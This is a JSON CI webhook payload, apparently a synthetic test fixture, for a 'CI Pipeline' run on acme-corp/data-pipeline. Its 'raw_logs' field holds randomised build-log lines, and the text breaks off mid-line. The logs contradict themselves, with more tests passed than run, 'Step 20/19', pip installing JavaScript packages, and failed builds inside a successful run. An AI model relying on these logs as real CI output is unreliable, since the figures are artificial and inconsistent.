{
  "action": "completed",
  "workflow_run": {
    "id": 61,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "e5d697eb9431e05c08e8bd0435332ade41388acf",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-25T12:45:57.535368Z",
    "updated_at": "2025-11-25T12:49:44.997285Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\npip install: Successfully installed jest-5.0\nStep 11/21: Building\nLoading...\n[12:45:57] WARN: Deprecated API usage\nCoverage: 77% statements, 82% branches\nPlatform: win32-x64\nWaiting...\nException: TypeError\nCompleted.\nInstalling react@3.8.2\nCache hit for key-5585\nCompiling src/handler.rs...\nCoverage: 82% statements, 84% branches\nChecking out main branch\nInstalling jest@2.12.10\npip: Collecting webpack\npip: Downloading webpack-4.5.tar.gz\nBuilding Docker image...\nUsing Node.js 18.5.9\nLoading...\n\u2713 Step 'setup' succeeded\nBundling main.js\nWaiting...\nWaiting...\nFAILED: test_db_connect\n[12:45:57] INFO: Starting build process\nStep 9/23: Building\nPulling image: node:3.11\nStep 6/17: Linting\nConnection established\nUsing Node.js 20.15.8\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (10MB)\nCompiling components/utils.go...\nPOST /api - 201 (165ms)\nWaiting...\n[12:45:57] INFO: Cache refreshed\npip: Downloading jest-3.6.tar.gz\n[12:45:57] INFO: Cache refreshed\nWaiting...\nReady.\nCache restored successfully (193MB)\nHEAD is now at 48894a6\nCache miss for key-2129\nTime: 76.640s\nCoverage: 78% statements, 92% branches\n\u2713 test completed\nCache miss for key-4182\n[12:45:57] DEBUG: Query executed in 12ms\nnpm install: resolved 1601 packages\nReady.\nUsing Node.js 18.10.7\nStep 15/15: Building\npip: Downloading axios-1.1.tar.gz\nRan 180 tests in 8s\nStep 17/22: Building\nWaiting...\nCompiling lib/service.java...\nnpm install: resolved 1183 packages\nyarn add: Done in 3.79s\nTransforming 884 files...\nLoading...\nOptimizing 54 modules...\nLayer 6/11: ENV command\nPOST /upload - 202 (387ms)\nOptimizing 51 modules...\nCompiling lib/handler.rs...\nTLS handshake completed\n\u2713 Task completed in 2248ms\nWARNING: webpack has known vulnerabilities\nCache invalidated: build\nStep 7/24: Installing dependencies\nCache invalidated: build\n\u2713 All checks passed\n\u2713 package completed\n\u2713 validate completed\nSwitched to branch 'hotfix/task-877'\n[12:45:57] DEBUG: Memory usage: 1068MB\nArtifact uploaded: dist.zip (54MB)\npip: Installing build dependencies...\npip: Installing build dependencies...\nnpm notice: created a lockfile\n[12:45:57] DEBUG: Initializing service\nTLS handshake completed\nCache restored successfully (322MB)\nBundling runtime.css\nCache miss for key-7562\nException: TypeError\nTLS handshake completed\nnpm install: resolved 1784 packages\nConnection established\nLoading...\nLoading...\nArtifact downloaded: 32MB\nSnapshots: 13 passed, 2 total\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\nTime: 13.732s\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 99% statements, 70% branches\n=== Step setup_environment completed ===\n=== Step: setup_node ===\nException: NullPointerException\nGET /status - 200 (66ms)\nFetching from https://amazonaws.com/package.json\nDone.\nCache saved successfully\npip: Collecting jest\npip: Downloading jest-2.12.tar.gz\nBuilding Docker image...\nTests: 353 passed, 190 total\npip: Collecting lodash\nOK\nRan 90 tests in 30s\n[12:45:57] INFO: Cache refreshed\nCompiling lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-9010\n\u2713 All checks passed\nTest Suites: 47 passed, 41 total\n[12:45:57] WARN: Deprecated API usage\n\u2713 build completed\npip: Downloading react-2.2.tar.gz\npip: Collecting jest\nCache invalidated: build\n[12:45:57] ERROR: Connection failed\n[12:45:57] DEBUG: Initializing service\nStep 5/25: Deploying\n[12:45:57] INFO: Request completed\nCompleted.\nProcessing...\nImage pulled successfully\nyarn add: Done in 13.20s\nCache miss for key-6797\nSnapshots: 48 passed, 44 total\nDone.\n  PASS: e2e/test_auth_login.spec.js\nTest Suites: 7 passed, 19 total\nCreating production build...\nFetching submodules...\npip: Installing build dependencies...\nGenerating source maps...\nnpm notice: created a lockfile\n\u2713 package completed\nCache saved successfully\n\u2713 Step 'checkout' succeeded\nTLS handshake completed\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.12\nFetching from https://github.com/package.json\nStep 2/25: Installing dependencies\nUsing Python 3.9\n[12:45:57] DEBUG: Query executed in 44ms\nCompleted.\n[12:45:57] INFO: Cache refreshed\nWaiting...\n[12:45:57] ERROR: Connection failed\nOptimizing 95 modules...\nCache saved successfully\nReady.\nBundling styles.css\nBundling styles.css\nPOST /api - 202 (275ms)\nFetching submodules...\n  PASS: test_db_connect (267ms)\n\u2713 Task completed in 4469ms\npip: Downloading axios-2.20.tar.gz\npip: Downloading eslint-3.11.tar.gz\nCache saved successfully\nCompiling utils/utils.go...\nTests: 262 passed, 70 total\n[12:45:57] INFO: Connecting to database\n\u2713 Task completed in 230ms\nPlatform: darwin-arm64\n\u2713 Task completed in 1954ms\nArtifact downloaded: 23MB\n[12:45:57] DEBUG: Memory usage: 338MB\n  PASS: test_api_health (433ms)\nnpm install: added 255 packages\n[12:45:57] DEBUG: Query executed in 53ms\nTests: 116 passed, 471 total\nHEAD is now at f6a745e\nPlatform: linux-x64\nCache miss for key-9269\nFetching submodules...\n[12:45:57] DEBUG: Query executed in 10ms\nUsing Node.js 19.9.5\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:45:57] INFO: Processing request\n\u2713 Step 'build' succeeded\nNODE_ENV=production\npip: Downloading prettier-5.10.tar.gz\nMinifying vendor.js\nStep 7/20: Installing dependencies\n\u2713 Step 'install' succeeded\n[12:45:57] DEBUG: Loading configuration\nProcessing...\n[12:45:57] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:57] WARN: Deprecated API usage\nWaiting...\nCreating production build...\n=== Step setup_node completed ===\n=== Step: checkout ===\nImage pulled successfully\nBuilding Docker image...\n[12:45:57] DEBUG: Memory usage: 840MB\nRan 86 tests in 44s\n\u2717 build failed with exit code 34\nPulling image: alpine:18\n[12:45:57] DEBUG: Loading configuration\n[12:45:57] DEBUG: Initializing service\nLayer 4/11: RUN command\nLayer 6/14: RUN command\nFinished.\nCache saved successfully\n[12:45:57] INFO: Starting build process\nPushing to registry...\nCompiling lib/utils.go...\nTLS handshake completed\nPushing to registry...\n[12:45:57] WARN: Deprecated API usage\npip: Downloading eslint-2.12.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling runtime.css\nTests: 206 passed, 213 total\n[12:45:57] DEBUG: Loading configuration\nTest Suites: 39 passed, 45 total\nGET /api - 201 (95ms)\nTest Suites: 31 passed, 31 total\n[12:45:57] INFO: Cache refreshed\n[12:45:57] DEBUG: Connection pool: 16 active\nWARNING: express has known vulnerabilities\nCache hit for key-3311\nSwitched to branch 'hotfix/task-594'\nInstalling jest@3.16.5\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLoading...\n\u2713 test completed\n[12:45:57] INFO: Processing request\nUsing Node.js 17.7.3\nArtifact uploaded: build.tar.gz (30MB)\npip: Collecting webpack\nWARNING: webpack has known vulnerabilities\nPlatform: darwin-arm64\n[12:45:57] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nAlready up to date.\nStep 8/19: Linting\npip: Collecting jest\nFetching from https://npmjs.org/package.json\nCreating production build...\nHEAD is now at 0ceb171\n\u2713 validate completed\nCompleted.\nEnvironment: production\npip: Installing build dependencies...\npip install: Successfully installed eslint-1.8\nCache miss for key-1873\nTime: 7.218s\nImage pulled successfully\nUploading artifact 'dist' (24 files)\n[12:45:57] DEBUG: Connection pool: 5 active\n[12:45:57] WARN: Deprecated API usage\nCompiling utils/app.ts...\nnpm notice: package.json updated\nnpm notice: package.json updated\nReady.\nUsing Node.js 19.13.5\nCompiling utils/index.js...\n\u2713 All checks passed\n\u2713 Task completed in 2780ms\nTests: 292 passed, 121 total\nPulling image: alpine:latest\nPulling image: alpine:3.11\nTLS handshake completed\nStep 15/18: Running migrations\nChecking out develop branch\n\u2717 build failed with exit code 11\npip install: Successfully installed prettier-2.6\nArtifact downloaded: 27MB\nReady.\n\u2713 Task completed in 2336ms\nPushing to registry...\nChecking out main branch\nImage pulled successfully\n[12:45:57] DEBUG: Query executed in 53ms\npip install: Successfully installed lodash-3.20\npip: Downloading webpack-3.1.tar.gz\nGenerating source maps...\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 10 tests in 46s\npip install: Successfully installed react-2.1\nWARNING: prettier has known vulnerabilities\npip install: Successfully installed react-1.20\nTests: 261 passed, 104 total\nFinished.\n[12:45:57] DEBUG: Connection pool: 3 active\n[12:45:57] INFO: Request completed\nMinifying app.js\nCompiling utils/utils.go...\nOK\npip: Downloading express-5.14.tar.gz\n=== Step checkout completed ===\n=== Step: deploy_staging ===\nCompiling utils/utils.go...\nPOST /api - 201 (227ms)\nCache miss for key-7883\nFetching from https://googleapis.com/package.json\nWARNING: jest has known vulnerabilities\npip: Collecting prettier\nCreating production build...\nTime: 30.642s\n  PASS: test_db_connect (372ms)\nTime: 21.914s\nStep 6/15: Deploying\nWARNING: jest has known vulnerabilities\nLayer 7/8: RUN command\nWARNING: lodash has known vulnerabilities\nStep 2/21: Deploying\nTest Suites: 31 passed, 46 total\nStep 11/24: Testing\nImage pulled successfully\nStep 2/21: Running migrations\nLayer 1/10: COPY command\nStep 10/18: Installing dependencies\nHEAD is now at 78eabc8\n[12:45:57] DEBUG: Connection pool: 10 active\n\u2713 build completed\nMinifying app.js\nTime: 5.409s\nHEAD is now at 09420e2\nCache hit for key-9291\n[12:45:57] INFO: Cache refreshed\n\u2713 Step 'checkout' succeeded\nReady.\nVerifying...\nFetching from https://pypi.org/package.json\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (59MB)\nStep 7/21: Testing\nAlready up to date.\n[12:45:57] INFO: Cache refreshed\nGenerating source maps...\nStep 14/25: Testing\nFetching from https://docker.io/package.json\nnpm notice: package.json updated\nHEAD is now at ac7587b\nPOST /data - 201 (180ms)\nUploading artifact 'dist' (17 files)\n[12:45:57] DEBUG: Loading configuration\nNODE_ENV=production\nVerifying...\nTime: 14.110s\nOK\nCompiling utils/utils.go...\nDone.\nPushing to registry...\nnpm notice: package.json updated\nEnvironment: staging\nMinifying vendor.js\nUsing Node.js 17.14.5\nFetching from https://registry.npmjs.org/package.json\nArtifact uploaded: build.tar.gz (32MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying app.js\nEnvironment: staging\nFetching submodules...\n[12:45:57] ERROR: Connection failed\nNODE_ENV=test\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\n  PASS: integration/test_db_connect.spec.js\nTests: 348 passed, 405 total\npip install: Successfully installed prettier-4.2\nnpm install: added 23 packages\nProcessing...\n[12:45:57] DEBUG: Connection pool: 17 active\n[12:45:57] DEBUG: Memory usage: 184MB\nUsing Python 3.9\n\u2713 deploy completed\nTransforming 323 files...\nUsing Python 3.12\nArtifact downloaded: 46MB\nSwitched to branch 'bugfix/task-257'\nOK\nUsing Python 3.10\nSuccess!\nPOST /api - 202 (400ms)\n[12:45:57] DEBUG: Initializing service\nTest Suites: 18 passed, 14 total\nAlready up to date.\n[12:45:57] INFO: Processing request\n[12:45:57] INFO: Starting build process\nWaiting...\n\u2713 build completed\nCompiling src/index.js...\nCache restored successfully (340MB)\npip: Downloading jest-4.11.tar.gz\nFetching submodules...\nWARNING: lodash has known vulnerabilities\nRan 38 tests in 33s\nArtifact uploaded: build.tar.gz (29MB)\nFetching from https://gcr.io/package.json\n[12:45:57] WARN: Deprecated API usage\n=== Step deploy_staging completed ===\n=== Step: e2e_tests ===\nAlready up to date.\npip install: Successfully installed react-5.3\n[12:45:57] INFO: Connecting to database\nVerifying...\nStep 6/15: Deploying\nWARNING: axios has known vulnerabilities\nFAILED: test_user_create\nWARNING: jest has known vulnerabilities\nArtifact downloaded: 23MB\nCache hit for key-9855\nnpm install: added 286 packages\nOptimizing 34 modules...\npip: Collecting axios\nnpm install: added 467 packages\nCache invalidated: node_modules\nGET /health - 204 (100ms)\nStep 6/19: Running migrations\nWaiting...\nCompiling utils/index.js...\n\u2717 build failed with exit code 12\nProcessing...\nUsing Node.js 17.9.3\n[12:45:57] DEBUG: Connection pool: 18 active\nFinished.\n\u2713 Step 'build' succeeded\nPOST /upload - 202 (234ms)\nWaiting...\nReady.\nPlatform: darwin-arm64\nGenerating source maps...\nSwitched to branch 'hotfix/task-546'\nStep 19/22: Running migrations\nMinifying main.js\nyarn add: Done in 8.47s\nNODE_ENV=development\nNODE_ENV=production\nFetching submodules...\npip: Collecting jest\nTransforming 449 files...\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\nyarn add: Done in 24.56s\nGET /health - 200 (92ms)\n[12:45:57] INFO: Processing request\nUsing Python 3.11\nMinifying app.js\nSuccess!\nEnvironment: test\n[12:45:57] INFO: Starting build process\nMinifying vendor.js\nSnapshots: 42 passed, 36 total\nGenerating source maps...\n[12:45:57] INFO: Cache refreshed\n[12:45:57] INFO: Connecting to database\nLayer 7/14: RUN command\nEnvironment: staging\nSuccess!\nPOST /api - 202 (174ms)\nFetching submodules...\n[12:45:57] DEBUG: Initializing service\nCache miss for key-9461\npip: Downloading axios-5.17.tar.gz\nStep 13/24: Running migrations\nWaiting...\nCache invalidated: build\n[12:45:57] INFO: Starting build process\nGenerating source maps...\nCompleted.\nTest Suites: 34 passed, 15 total\nCompiling lib/handler.rs...\n[12:45:57] INFO: Connecting to database\nFAILED: test_api_health\nCache miss for key-1525\nFetching submodules...\nGenerating source maps...\nRan 196 tests in 47s\nSwitched to branch 'feature/task-464'\nInstalling react@1.5.2\nStep 18/20: Linting\nLayer 3/12: ENV command\nInstalling react@4.12.3\nException: TypeError\n\u2713 All checks passed\nArtifact uploaded: dist.zip (45MB)\n[12:45:57] INFO: Connecting to database\nCoverage: 97% statements, 65% branches\nArtifact downloaded: 17MB\nTLS handshake completed\nUsing Python 3.10\nTests: 84 passed, 395 total\nException: ValueError\nCache miss for key-3717\nWARNING: jest has known vulnerabilities\npip install: Successfully installed lodash-5.17\nCache invalidated: build\nCreating production build...\npip install: Successfully installed prettier-3.12\nCompiling src/utils.go...\nFinished.\n\u2713 package completed\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nSuccess!\nCache invalidated: build\nOptimizing 25 modules...\nGenerating source maps...\nGET /health - 200 (84ms)\nArtifact uploaded: dist.zip (3MB)\nStep 15/16: Installing dependencies\n[12:45:57] INFO: Request completed\n[12:45:57] INFO: Starting build process\nVerifying...\nRan 30 tests in 42s\nStep 5/24: Building\nMinifying vendor.js\n\u2713 Step 'test' succeeded\nCoverage: 72% statements, 95% branches\nCache miss for key-6771\nStep 12/22: Testing\n\u2717 build failed with exit code 41\n\u2713 Task completed in 1684ms\nTests: 121 passed, 346 total\n\u2713 Step 'test' succeeded\nRan 167 tests in 3s\nFetching from https://npmjs.org/package.json\nTests: 407 passed, 338 total\nOK\nBundling styles.js\nEnvironment: production\nTLS handshake completed\nWaiting...\n[12:45:57] INFO: Starting build process\npip: Installing build dependencies...\nnpm install: resolved 694 packages\nGenerating source maps...\nGenerating source maps...\nyarn add: Done in 28.54s\nSwitched to branch 'feature/task-803'\npip: Installing build dependencies...\n[12:45:57] DEBUG: Query executed in 10ms\nWARNING: eslint has known vulnerabilities\npip: Installing build dependencies...\nReady.\nPulling image: node:latest\nFetching from https://github.com/package.json\nSnapshots: 31 passed, 43 total\n[12:45:57] WARN: Deprecated API usage\npip: Collecting axios\nArtifact uploaded: build.tar.gz (10MB)\n[12:45:57] INFO: Request completed\nBundling styles.js\nyarn add: Done in 11.78s\nStep 19/23: Building\n[12:45:57] ERROR: Connection failed\n[12:45:57] WARN: Deprecated API usage\npip: Downloading prettier-2.6.tar.gz\n[12:45:57] WARN: Deprecated API usage\nPushing to registry...\n\u2713 Task completed in 1600ms\nSnapshots: 1 passed, 49 total\npip: Downloading express-5.12.tar.gz\npip: Downloading prettier-4.17.tar.gz\npip: Collecting jest\nArtifact downloaded: 32MB\n[12:45:57] INFO: Cache refreshed\nCompiling components/handler.rs...\nStep 10/18: Installing dependencies\n[12:45:57] DEBUG: Memory usage: 683MB\n[12:45:57] DEBUG: Query executed in 81ms\n[12:45:57] INFO: Starting build process\n[12:45:57] WARN: Deprecated API usage\nCompiling lib/handler.rs...\nSnapshots: 39 passed, 11 total\n[12:45:57] WARN: Deprecated API usage\n[12:45:57] DEBUG: Initializing service\nBuilding Docker image...\nWaiting...\nStep 17/24: Testing\n\u2717 build failed with exit code 31\nTests: 355 passed, 413 total\n[12:45:57] WARN: Deprecated API usage\n[12:45:57] INFO: Connecting to database\nHEAD is now at b9b4472\npip: Installing build dependencies...\n[12:45:57] WARN: Deprecated API usage\nStep 5/19: Running migrations\nFetching from https://gcr.io/package.json\n[12:45:57] INFO: Starting build process\nLayer 3/10: RUN command\nCache miss for key-4369\nVerifying...\n  PASS: test_auth_login (291ms)\n[12:45:57] WARN: Deprecated API usage\nConnection established\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\nCoverage: 82% statements, 76% branches\nPulling image: node:18\nStep 3/24: Linting\nSuccess!\n[12:45:57] WARN: Deprecated API usage\nOK\n=== Step restore_cache completed ===\n=== Step: lint ===\nBundling styles.css\n\u2713 Task completed in 2405ms\nCache restored successfully (205MB)\nyarn add: Done in 3.2s\nRan 47 tests in 6s\nAlready up to date.\n[12:45:57] INFO: Processing request\nHEAD is now at f57db56\n[12:45:57] INFO: Request completed\nArtifact uploaded: build.tar.gz (19MB)\nUsing Python 3.11\n[12:45:57] DEBUG: Memory usage: 1826MB\n[12:45:57] INFO: Connecting to database\nCompleted.\n  PASS: test_cache_hit (495ms)\nReady.\npip: Collecting express\nSnapshots: 47 passed, 14 total\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\nCoverage: 87% statements, 70% branches\nPulling image: alpine:3.11\nnpm notice: created a lockfile\nVerifying...\nLayer 10/15: COPY command\nStep 7/17: Linting\nStep 11/22: Running migrations\npip: Installing build dependencies...\n[12:45:57] DEBUG: Initializing service\nMinifying main.js\nWARNING: eslint has known vulnerabilities\nCompleted.\nCompiling components/service.java...\nInstalling jest@1.7.7\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: RuntimeError\nTLS handshake completed\nUploading artifact 'coverage' (20 files)\nTest Suites: 49 passed, 13 total\n[12:45:57] INFO: Processing request\nNODE_ENV=production\n\u2713 Step 'setup' succeeded\n[12:45:57] INFO: Connecting to database\nCompiling src/service.java...\nWARNING: eslint has known vulnerabilities\nTest Suites: 30 passed, 27 total\n[12:45:57] INFO: Cache refreshed\n  PASS: integration/test_api_health.spec.js\nNODE_ENV=test\nnpm notice: created a lockfile\nException: NullPointerException\nCache miss for key-2968\n[12:45:57] WARN: Deprecated API usage\nStep 3/25: Installing dependencies\n[12:45:57] DEBUG: Memory usage: 951MB\nPulling image: python:18\nFetching submodules...\nLayer 9/15: COPY command\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: unit/test_db_connect.spec.js\nLayer 7/14: RUN command\nCache miss for key-3484\n\u2717 build failed with exit code 61\nStep 11/21: Building\nReady.\nStep 6/24: Running migrations\n[12:45:57] INFO: Cache refreshed\nLoading...\n[12:45:57] INFO: Connecting to database\n[12:45:57] DEBUG: Loading configuration\nBundling runtime.js\n[12:45:57] INFO: Connecting to database\n[12:45:57] WARN: Deprecated API usage\nyarn add: Done in 12.19s\nStep 3/23: Building\nVerifying...\nEnvironment: development\n[12:45:57] INFO: Connecting to database\nProcessing...\nFetching from https://githubusercontent.com/package.json\nCoverage: 75% statements, 87% branches\nyarn add: Done in 5.34s\nException: TypeError\nNODE_ENV=test\nWARNING: express has known vulnerabilities\nStep 13/19: Testing\nnpm install: resolved 1039 packages\nTest Suites: 33 passed, 48 total\nPulling image: python:3.11\nWaiting...\n\u2713 Step 'build' succeeded\nTime: 99.350s\n[12:45:57] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nCreating production build...\nEnvironment: development\nLoading...\npip: Installing build dependencies...\nPOST /upload - 201 (362ms)\nWARNING: webpack has known vulnerabilities\n=== Step lint completed ===\n=== Step: integration_tests ===\nOptimizing 36 modules...\nnpm notice: package.json updated\nSuccess!\n[12:45:57] INFO: Cache refreshed\nStep 18/18: Deploying\nConnection established\n[12:45:57] DEBUG: Initializing service\n[12:45:57] INFO: Cache refreshed\n\u2713 Task completed in 2948ms\n  PASS: e2e/test_user_create.spec.js\n[12:45:57] ERROR: Connection failed\nnpm notice: package.json updated\n  PASS: integration/test_db_connect.spec.js\nWARNING: lodash has known vulnerabilities\n\u2713 All checks passed\nTime: 102.752s\nChecking out develop branch\nCompiling components/handler.rs...\nnpm notice: package.json updated\nFinished.\nDone.\nOK\nConnection established\nCreating production build...\nCache hit for key-6606\nWARNING: jest has known vulnerabilities\n[12:45:57] INFO: Request completed\nnpm install: resolved 1108 packages\nVerifying...\nPlatform: win32-x64\nRan 60 tests in 14s\n\u2713 package completed\nTest Suites: 25 passed, 11 total\nPushing to registry...\nPushing to registry...\nCache restored successfully (350MB)\nArtifact downloaded: 16MB\nMinifying main.js\nSnapshots: 13 passed, 30 total\nWaiting...\nUsing Node.js 15.13.9\nWARNING: axios has known vulnerabilities\nCompiling utils/handler.rs...\nTime: 96.269s\n[12:45:57] DEBUG: Loading configuration\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (28MB)\nCache miss for key-2050\n[12:45:57] INFO: Request completed\n\u2717 build failed with exit code 72\npip: Downloading prettier-5.15.tar.gz\n\u2717 build failed with exit code 115\nFinished.\nReady.\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:57] DEBUG: Connection pool: 1 active\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@4.11.10\nRan 185 tests in 59s\nTLS handshake completed\nVerifying...\nTLS handshake completed\npip: Downloading react-5.18.tar.gz\nAlready up to date.\nSuccess!\nPulling image: python:3.11\nPOST /api - 201 (133ms)\nCompleted.\nFinished.\nCreating production build...\nUsing Node.js 18.18.3\nnpm notice: package.json updated\nTransforming 326 files...\nFinished.\n[12:45:57] INFO: Processing request\nOptimizing 32 modules...\nTransforming 907 files...\nUploading artifact 'build' (23 files)\nStep 4/21: Installing dependencies\n\u2717 build failed with exit code 35\nDone.\nCache saved successfully\nPOST /api - 200 (482ms)\nCompiling components/utils.go...\nProcessing...\n[12:45:57] WARN: Deprecated API usage\nFinished.\nPushing to registry...\nnpm install: added 379 packages\n[12:45:57] WARN: Deprecated API usage\nUsing Python 3.11\nPOST /api - 202 (458ms)\nPOST /api - 202 (489ms)\nFAILED: test_api_health\nChecking out main branch\nStep 20/20: Installing dependencies\nStep 2/16: Testing\n[12:45:57] DEBUG: Loading configuration\n[12:45:57] DEBUG: Initializing service\n=== Step integration_tests completed ===\n=== Step: save_cache ===\nTest Suites: 26 passed, 49 total\n[12:45:57] DEBUG: Initializing service\nStep 20/19: Deploying\nPlatform: win32-x64\nCoverage: 82% statements, 64% branches\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/main.py...\n[12:45:57] INFO: Connecting to database\n[12:45:57] INFO: Request completed\nException: RuntimeError\n[12:45:57] INFO: Processing request\nTest Suites: 37 passed, 14 total\n[12:45:57] DEBUG: Connection pool: 9 active\nStep 3/21: Deploying\nImage pulled successfully\nSnapshots: 1 passed, 15 total\n  PASS: unit/test_api_health.spec.js\nTransforming 977 files...\nSnapshots: 30 passed, 27 total\nOptimizing 87 modules...\nTime: 90.702s\nChecking out main branch\nInstalling express@1.8.6\nPushing to registry...\nStep 9/22: Running migrations\nPulling image: alpine:3.11\n  PASS: test_cache_hit (114ms)\nArtifact uploaded: build.tar.gz (14MB)\nSuccess!\nRan 55 tests in 31s\nBuilding Docker image...\nTransforming 593 files...\nOK\nTLS handshake completed\nBuilding Docker image...\nRan 164 tests in 29s\nCreating production build...\nStep 12/19: Building\nUsing Python 3.9\nEnvironment: development\n\u2713 Task completed in 3300ms\nReady.\nPOST /upload - 200 (344ms)\nAlready up to date.\nGenerating source maps...\nCache restored successfully (392MB)\nWARNING: axios has known vulnerabilities\nPlatform: linux-x64\nStep 5/23: Linting\nEnvironment: test\nPlatform: win32-x64\nStep 2/19: Running migrations\nCache hit for key-8960\nUploading artifact 'coverage' (12 files)\n[12:45:57] WARN: Deprecated API usage\n[12:45:57] DEBUG: Loading configuration\n[12:45:57] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nStep 18/24: Installing dependencies\nArtifact uploaded: build.tar.gz (10MB)\nOptimizing 54 modules...\nGET /api - 201 (70ms)\nImage pulled successfully\npip: Collecting lodash\nOptimizing 66 modules...\nyarn add: Done in 10.8s\nVerifying...\nPushing to registry...\nException: RuntimeError\nWARNING: express has known vulnerabilities\n[12:45:57] DEBUG: Connection pool: 10 active\nFinished.\nInstalling express@4.4.7\npip install: Successfully installed axios-4.1\n[12:45:57] DEBUG: Connection pool: 5 active\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (48MB)\n[12:45:57] DEBUG: Query executed in 56ms\n[12:45:57] WARN: Deprecated API usage\npip install: Successfully installed axios-2.10\n[12:45:57] WARN: Deprecated API usage\nNODE_ENV=production\nnpm notice: package.json updated\nVerifying...\nSnapshots: 27 passed, 37 total\nCache restored successfully (452MB)\npip install: Successfully installed jest-5.11\n[12:45:57] DEBUG: Query executed in 60ms\nTests: 309 passed, 52 total\nCache saved successfully\nnpm notice: package.json updated\nImage pulled successfully\nnpm notice: created a lockfile\nRan 142 tests in 50s\n[12:45:57] WARN: Deprecated API usage\nStep 6/25: Deploying\nStep 1/16: Linting\nCache invalidated: build\n\u2713 package completed\nArtifact uploaded: dist.zip (86MB)\n=== Step save_cache completed ===\n=== Step: upload_artifacts ===\n\u2713 build completed\nGET /api - 201 (59ms)\nPushing to registry...\nFetching from https://npmjs.org/package.json\nPlatform: darwin-arm64\nStep 18/18: Installing dependencies\nWARNING: eslint has known vulnerabilities\n[12:45:57] DEBUG: Initializing service\nCache saved successfully\n[12:45:57] DEBUG: Loading configuration\nTLS handshake completed\nLoading...\n[12:45:57] DEBUG: Initializing service\nLoading...\nWARNING: eslint has known vulnerabilities\npip: Downloading jest-3.8.tar.gz\nPOST /api - 202 (53ms)\nRan 188 tests in 39s\nDone.\n\u2717 build failed with exit code 105\nPushing to registry...\npip: Collecting prettier\nFetching from https://githubusercontent.com/package.json\nCompiling src/app.ts...\nException: RuntimeError\nReady.\npip: Collecting jest\nStep 16/22: Building\nOptimizing 25 modules...\nUsing Python 3.11\n[12:45:57] INFO: Processing request\nCache saved successfully\nnpm notice: package.json updated\nSwitched to branch 'feature/task-994'\nTime: 75.216s\nConnection established\n[12:45:57] DEBUG: Loading configuration\nCache miss for key-6086\nFAILED: test_db_connect\n[12:45:57] DEBUG: Query executed in 69ms\n\u2713 build completed\n[12:45:57] WARN: Deprecated API usage\nCompiling utils/handler.rs...\nMinifying main.js\n\u2717 build failed with exit code 102\nStep 12/16: Linting\n[12:45:57] DEBUG: Initializing service\n\u2713 Step 'setup' succeeded\nImage pulled successfully\nTest Suites: 49 passed, 35 total\nUsing Python 3.12\n\u2713 package completed\nCache restored successfully (52MB)\nRan 162 tests in 32s\nUploading artifact 'coverage' (19 files)\nStep 18/24: Building\nRan 22 tests in 44s\nChecking out main branch\nGET /api - 200 (36ms)\nStep 6/19: Installing dependencies\n[12:45:57] INFO: Connecting to database\nPlatform: linux-x64\nCoverage: 73% statements, 63% branches\nSuccess!\nnpm install: added 327 packages\nHEAD is now at 8b65289\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:45:57] DEBUG: Connection pool: 7 active\nSwitched to branch 'feature/task-239'\n[12:45:57] DEBUG: Query executed in 45ms\nLoading...\nNODE_ENV=development\nProcessing...\nTLS handshake completed\nTLS handshake completed\npip: Downloading prettier-5.19.tar.gz\n[12:45:57] INFO: Starting build process\nMinifying vendor.js\nPOST /data - 201 (191ms)\n[12:45:57] DEBUG: Initializing service\nDone.\nWaiting...\n[12:45:57] INFO: Connecting to database\nWARNING: react has known vulnerabilities\nTests: 125 passed, 267 total\nRan 111 tests in 28s\nArtifact uploaded: build.tar.gz (29MB)\npip install: Successfully installed webpack-2.16\nTime: 2.15s\nTest Suites: 30 passed, 11 total\nWARNING: lodash has known vulnerabilities\nReady.\nFetching from https://googleapis.com/package.json\nCache invalidated: node_modules\nDone.\n[12:45:57] WARN: Deprecated API usage\nnpm notice: created a lockfile\npip install: Successfully installed react-2.5\n[12:45:57] INFO: Request completed\nLoading...\n=== Step upload_artifacts completed ===\n=== Step: type_check ===\n[12:45:57] INFO: Connecting to database\npip install: Successfully installed jest-4.12\n[12:45:57] INFO: Request completed\nBundling styles.css\nHEAD is now at 909f623\nCompiling lib/main.py...\n[12:45:57] WARN: Deprecated API usage\nTest Suites: 13 passed, 36 total\nArtifact uploaded: build.tar.gz (39MB)\nCache miss for key-5335\npip: Downloading react-4.10.tar.gz\n  PASS: test_api_health (481ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:45:57] 